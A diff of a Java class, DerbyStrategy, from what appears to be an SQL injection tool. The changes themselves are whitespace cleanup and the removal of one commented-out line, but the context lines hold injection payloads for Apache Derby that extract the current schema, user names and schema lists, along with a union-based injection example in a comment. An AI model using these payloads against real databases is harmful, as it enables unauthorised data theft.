@@ -12,18 +12,18 @@ public class DerbyStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return 
+        return
             "SELECT+'-'||'{%}'||CURRENT+SCHEMA"
             + "||'{%}'||CURRENT_USER||'{%}'||SESSION_USER||'%01%03%03%07'from+SYSIBM.SYSDUMMY1";
     }
 
     @Override
     public String getSchemaList() {
-        return 
+        return
             /**
              * aggreg function return exec fault
              * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
-             * => use limit 1,1 instead 
+             * => use limit 1,1 instead
              */
             "select+'%04'||schemaname||'%050%04%01%03%03%07'FROM+SYS.SYSSCHEMAS{limit}";
     }
@@ -65,7 +65,7 @@ public class DerbyStrategy extends ASQLStrategy {
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return 
+        return
             "select+" +
                 /**
                  * If reach end of string (SQLii) then NULLIF nullifies the result
@@ -78,7 +78,7 @@ public class DerbyStrategy extends ASQLStrategy {
 
      @Override
      public String performanceQuery(String[] indexes) {
-         return 
+         return
              MediatorModel.model().initialQuery.replaceAll(
                  "1337(" + ToolsString.join(indexes, "|") + ")7331",
                  "(select+'SQLi$1'||'%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23'||'iLQS'from+SYSIBM.SYSDUMMY1)"
@@ -101,7 +101,6 @@ public class DerbyStrategy extends ASQLStrategy {
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-//        return "+ROWS+" + (limitSQLResult+1) + "+TO+" + (limitSQLResult+1) + "";
         return "+OFFSET+" + limitSQLResult + "+ROWS+FETCH+NEXT+1+ROWS+ONLY";
     }
     
